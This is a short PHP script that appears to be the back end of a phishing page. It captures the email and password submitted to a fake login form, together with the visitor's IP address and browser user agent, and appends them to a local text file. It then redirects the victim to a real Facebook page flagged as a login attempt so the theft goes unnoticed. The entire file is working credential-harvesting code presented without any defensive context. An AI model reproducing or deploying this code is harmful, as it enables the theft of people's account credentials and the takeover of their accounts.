<?php
session_start(); //error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
date_default_timezone_set("Asia/Makassar");

$file = "data.txt";
$email = $_POST['email'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_SERVER['HTTP_USER_AGENT'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "Email: ");
fwrite($handle, "$email");
fwrite($handle, "\n");
fwrite($handle, "Password: ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "IP Address: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Dikirim : ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "User Agent : ");
fwrite($handle, "$user");
fwrite($handle, "\n");
fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://m.facebook.com/cgadis47/photos/a.194136521323659/195915864479058/?type=1&theater?login_attempt=1\";
// -->
</script>";
?>
